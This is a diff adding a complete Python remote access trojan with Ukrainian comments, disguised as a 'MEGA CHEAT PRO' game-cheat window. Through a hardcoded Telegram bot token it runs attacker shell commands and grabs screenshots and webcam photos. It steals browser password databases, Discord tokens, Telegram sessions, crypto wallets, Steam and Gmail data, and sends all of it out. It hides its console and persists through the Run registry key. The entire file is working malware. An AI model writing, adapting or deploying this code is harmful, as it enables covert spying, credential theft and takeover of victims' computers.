@@ -1,0 +1,356 @@
+import os,sys,subprocess,threading,time,urllib.request,urllib.parse,json,ctypes,shutil,tkinter as tk
+from tkinter import messagebox
+import winreg,zipfile,re
+
+# ================== НАЛАШТУВАННЯ ==================
+TOKEN = "8552043299:AAHh4-QPU5i9fTuhX9DHblhY6o8Rx2lfEpc"
+CHAT_ID = "5528192482"
+# ===================================================
+
+if sys.platform=="win32":
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
+
+def send_msg(t):
+    try:
+        urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+            data=urllib.parse.urlencode({'chat_id':CHAT_ID,'text':t[:4000]}).encode())
+    except: pass
+
+def send_file(p):
+    try:
+        with open(p,'rb')as f:
+            boundary='----boundary'+str(time.time()).replace('.','')
+            body=(f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
+                  f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{os.path.basename(p)}"\r\n'
+                  'Content-Type: application/octet-stream\r\n\r\n').encode()+f.read()+f'\r\n--{boundary}--\r\n'.encode()
+            req=urllib.request.Request(f"https://api.telegram.org/bot{TOKEN}/sendDocument",data=body,method='POST')
+            req.add_header('Content-Type',f'multipart/form-data; boundary={boundary}')
+            urllib.request.urlopen(req)
+    except: pass
+
+# ---------- АВТОМАТИЧНЕ ВСТАНОВЛЕННЯ МОДУЛІВ ----------
+def install_module(module_name, pip_name=None):
+    if pip_name is None:
+        pip_name = module_name
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pip_name],
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
+
+def ensure_module(imp_name, pip_name):
+    try:
+        __import__(imp_name)
+        return True
+    except ImportError:
+        if install_module(imp_name, pip_name):
+            try:
+                __import__(imp_name)
+                return True
+            except:
+                return False
+        return False
+
+# ---------- Скріншот ----------
+def screenshot():
+    if ensure_module('PIL', 'pillow'):
+        from PIL import ImageGrab
+        try:
+            ImageGrab.grab().save('s.png')
+            send_file('s.png')
+            os.remove('s.png')
+        except Exception as e:
+            send_msg(f"❌ Помилка скріншота: {e}")
+    else:
+        send_msg("❌ Не вдалося встановити Pillow")
+
+# ---------- Вебкамера ----------
+def webcam_photo():
+    if ensure_module('cv2', 'opencv-python'):
+        import cv2
+        try:
+            cap=cv2.VideoCapture(0)
+            if not cap.isOpened():
+                send_msg("❌ Вебкамера не знайдена")
+                return
+            ret,frame=cap.read()
+            if ret:
+                cv2.imwrite('cam.jpg',frame)
+                send_file('cam.jpg')
+                os.remove('cam.jpg')
+            else:
+                send_msg("❌ Не вдалося зробити фото")
+            cap.release()
+        except Exception as e:
+            send_msg(f"❌ Помилка вебкамери: {e}")
+    else:
+        send_msg("❌ Не вдалося встановити OpenCV")
+
+# ---------- Відтворення звуку (mp3, wav) ----------
+def play_sound(path):
+    if ensure_module('pygame', 'pygame'):
+        import pygame
+        try:
+            pygame.mixer.init()
+            pygame.mixer.music.load(path)
+            pygame.mixer.music.play()
+            while pygame.mixer.music.get_busy():
+                time.sleep(0.1)
+            send_msg(f"🎵 Відтворюється: {path}")
+            return
+        except:
+            pass
+    try:
+        import winsound
+        winsound.PlaySound(path, winsound.SND_FILENAME)
+        send_msg(f"🎵 Відтворюється WAV: {path}")
+    except:
+        send_msg("❌ Не вдалося відтворити")
+
+# ---------- Зміна шпалер з URL ----------
+def set_wallpaper_from_url(url):
+    try:
+        img_path=os.path.join(os.environ['TEMP'],'wallpaper.jpg')
+        urllib.request.urlretrieve(url,img_path)
+        ctypes.windll.user32.SystemParametersInfoW(20,0,img_path,0)
+        send_msg("✅ Шпалери змінено")
+    except Exception as e:
+        send_msg(f"❌ Помилка: {e}")
+
+# ---------- Крадіжка Steam ----------
+def steal_steam():
+    paths=[]
+    try:
+        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Valve\Steam")
+        steam_path=winreg.QueryValueEx(key,"SteamPath")[0]
+        paths.append(steam_path)
+    except: pass
+    default_paths=[
+        os.path.expandvars(r"%PROGRAMFILES(x86)%\Steam"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Steam")
+    ]
+    for p in default_paths:
+        if os.path.exists(p): paths.append(p)
+    found=False
+    for base in paths:
+        if not os.path.exists(base): continue
+        with zipfile.ZipFile('steam.zip','w') as z:
+            for file in os.listdir(base):
+                if file.startswith('ssfn') or file=='config' or file.endswith('.vdf'):
+                    full=os.path.join(base,file)
+                    if os.path.isfile(full):
+                        z.write(full,file)
+                        found=True
+        if found:
+            send_file('steam.zip')
+            os.remove('steam.zip')
+            send_msg("✅ Steam дані вкрадено")
+            return
+    send_msg("❌ Steam не знайдено")
+
+# ---------- Крадіжка Gmail з браузерів ----------
+def steal_gmail():
+    import sqlite3
+    emails=[]
+    paths={
+        'chrome':os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
+        'edge':os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
+    }
+    for name,path in paths.items():
+        if not os.path.exists(path): continue
+        try:
+            shutil.copy2(path,'temp.db')
+            conn=sqlite3.connect('temp.db')
+            cursor=conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                url,user,pass_enc=row
+                if 'gmail.com' in url or 'google.com' in url:
+                    emails.append(f"{url} | {user} | (пароль зашифрований)")
+            conn.close()
+            os.remove('temp.db')
+        except: pass
+    if emails:
+        with open('gmail.txt','w',encoding='utf-8')as f:
+            f.write('\n'.join(emails))
+        send_file('gmail.txt')
+        os.remove('gmail.txt')
+        send_msg("✅ Знайдено Gmail акаунти (паролі зашифровані)")
+    else:
+        send_msg("❌ Gmail не знайдено")
+
+# ---------- Інші функції крадіжки ----------
+def steal_browser_passwords():
+    sent=0
+    paths={
+        'chrome':os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
+        'edge':os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"),
+        'opera':os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Login Data")
+    }
+    for n,p in paths.items():
+        if os.path.exists(p):
+            try:
+                shutil.copy2(p,f'{n}_login.db')
+                send_file(f'{n}_login.db')
+                os.remove(f'{n}_login.db')
+                sent+=1
+            except: pass
+    if sent: send_msg(f"✅ Надіслано {sent} файлів паролів")
+    else: send_msg("❌ Паролі не знайдено")
+
+def steal_discord():
+    t=[]
+    for p in [os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
+              os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb")]:
+        if os.path.exists(p):
+            for f in os.listdir(p):
+                if f.endswith(('.ldb','.log')):
+                    with open(os.path.join(p,f),'r',errors='ignore')as ff:
+                        t+=re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}',ff.read())
+    if t:
+        with open('d.txt','w')as f:f.write('\n'.join(set(t)))
+        send_file('d.txt');os.remove('d.txt')
+        send_msg(f"✅ Знайдено {len(set(t))} токенів Discord")
+    else: send_msg("❌ Токени не знайдено")
+
+def steal_telegram():
+    p=os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata")
+    if os.path.exists(p):
+        with zipfile.ZipFile('tg.zip','w')as z:
+            for r,_,f in os.walk(p):
+                for ff in f:
+                    z.write(os.path.join(r,ff),os.path.relpath(os.path.join(r,ff),p))
+        send_file('tg.zip');os.remove('tg.zip')
+        send_msg("✅ Сесія Telegram вкрадена")
+    else: send_msg("❌ Telegram не знайдено")
+
+def steal_wallets():
+    w=[os.path.expandvars(r"%APPDATA%\Bitcoin\wallets"),
+       os.path.expandvars(r"%APPDATA%\Ethereum\keystore"),
+       os.path.expandvars(r"%APPDATA%\MetaMask\Local Storage\leveldb")]
+    f=[]
+    for p in w:
+        if os.path.exists(p):
+            if os.path.isfile(p): send_file(p);f.append(p)
+            else:
+                with zipfile.ZipFile(f'w_{os.path.basename(p)}.zip','w')as z:
+                    for r,_,ff in os.walk(p):
+                        for fff in ff[:10]:
+                            try:z.write(os.path.join(r,fff))
+                            except:pass
+                send_file(f'w_{os.path.basename(p)}.zip');os.remove(f'w_{os.path.basename(p)}.zip');f.append(p)
+    if f: send_msg(f"✅ Надіслано {len(f)} гаманців")
+    else: send_msg("❌ Гаманці не знайдено")
+
+def steal_nft():
+    fld=[os.path.expandvars(r"%USERPROFILE%\Downloads"),
+         os.path.expandvars(r"%USERPROFILE%\Desktop"),
+         os.path.expandvars(r"%USERPROFILE%\Pictures")]
+    n=[]
+    for d in fld:
+        if os.path.exists(d):
+            for f in os.listdir(d):
+                if any(f.lower().endswith(e)for e in['.png','.jpg','.gif','.mp4','.json'])and('nft'in f.lower()or'crypto'in f.lower()):
+                    n.append(os.path.join(d,f))
+    if n:
+        with zipfile.ZipFile('nft.zip','w')as z:
+            for f in n[:20]:z.write(f,os.path.basename(f))
+        send_file('nft.zip');os.remove('nft.zip')
+        send_msg(f"✅ Знайдено {len(n)} NFT файлів")
+    else: send_msg("❌ NFT не знайдено")
+
+def steal_all():
+    send_msg("🔄 Крадіжка всіх даних...")
+    steal_browser_passwords()
+    steal_discord()
+    steal_telegram()
+    steal_wallets()
+    steal_nft()
+    steal_steam()
+    steal_gmail()
+    send_msg("✅ Завершено")
+
+# ---------- Обробка команд ----------
+def cmd_thread():
+    off=0
+    while True:
+        try:
+            with urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={off}&timeout=10")as r:
+                data=json.loads(r.read().decode())
+            for u in data['result']:
+                off=u['update_id']+1
+                if 'message'in u and 'text'in u['message']:
+                    t=u['message']['text'].strip()
+                    if t.startswith('/cmd '):
+                        c=t[5:];r=subprocess.run(c,shell=True,capture_output=True,text=True)
+                        send_msg(f"OUT:\n{r.stdout}\nERR:\n{r.stderr}")
+                    elif t.startswith('/msg '):
+                        msg=t[5:];threading.Thread(target=lambda m=msg:messagebox.showinfo("",m)).start()
+                    elif t=='/screen':screenshot()
+                    elif t=='/cam':webcam_photo()
+                    elif t.startswith('/play '):
+                        play_sound(t[6:])
+                    elif t.startswith('/wallpaper '):
+                        set_wallpaper_from_url(t[11:])
+                    elif t.startswith('/open '):
+                        subprocess.Popen(t[6:],shell=True);send_msg(f"✅ {t[6:]}")
+                    elif t.startswith('/close '):
+                        os.system(f"taskkill /f /im {t[7:]}.exe >nul 2>&1");send_msg(f"✅ {t[7:]}")
+                    elif t=='/list':
+                        r=subprocess.run("tasklist",shell=True,capture_output=True,text=True)
+                        send_msg(r.stdout[:3000])
+                    elif t.startswith('/get '):
+                        p=t[5:];send_file(p)if os.path.exists(p)else send_msg("❌ Файл не знайдено")
+                    elif t.startswith('/dir '):
+                        p=t[5:];send_msg('\n'.join(os.listdir(p)[:50]))if os.path.exists(p)else send_msg("❌ Папку не знайдено")
+                    elif t=='/steam':steal_steam()
+                    elif t=='/gmail':steal_gmail()
+                    elif t=='/steal_pass':steal_browser_passwords()
+                    elif t=='/steal_discord':steal_discord()
+                    elif t=='/steal_telegram':steal_telegram()
+                    elif t=='/steal_wallets':steal_wallets()
+                    elif t=='/steal_nft':steal_nft()
+                    elif t=='/steal_all':steal_all()
+                    elif t in('/start','/help'):
+                        send_msg("""🔰 НОВІ КОМАНДИ:
+/steam - крадіжка Steam
+/gmail - Gmail акаунти
+/cam - фото з вебкамери
+/play шлях - mp3/wav
+/wallpaper URL - зміна шпалер
+
+Інші:
+/screen /msg /cmd /open /close /list /get /dir
+/steal_pass /steal_discord /steal_telegram /steal_wallets /steal_nft /steal_all""")
+        except Exception as e:
+            time.sleep(1)
+        time.sleep(0.5)
+
+# ---------- Автозапуск ----------
+def add_to_startup():
+    try:
+        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key,"WinSec",0,winreg.REG_SZ,sys.executable+' "'+__file__+'"')
+        winreg.CloseKey(key)
+    except: pass
+
+# ---------- Фейкове меню ----------
+class Menu:
+    def __init__(s):
+        s.r=tk.Tk()
+        s.r.title("⚡ MEGA CHEAT PRO ⚡")
+        s.r.geometry("500x500")
+        s.r.configure(bg='black')
+        tk.Label(s.r,text="PREMIUM CHEAT ACTIVATED",fg='lime',bg='black',font=("Arial",16)).pack(pady=20)
+        for t in["AIMBOT","WALLHACK","ESP","FLY","FARM"]:
+            tk.Button(s.r,text=t,command=s.c,bg='gray',fg='white').pack(pady=5)
+        send_msg("🚀 Жертва запустила чіт")
+        threading.Thread(target=cmd_thread,daemon=True).start()
+        s.r.mainloop()
+    def c(s): send_msg("👆 Клік")
+
+if __name__=="__main__":
+    add_to_startup()
+    send_msg("✅ RAT ULTIMATE запущено. /help")
+    Menu()
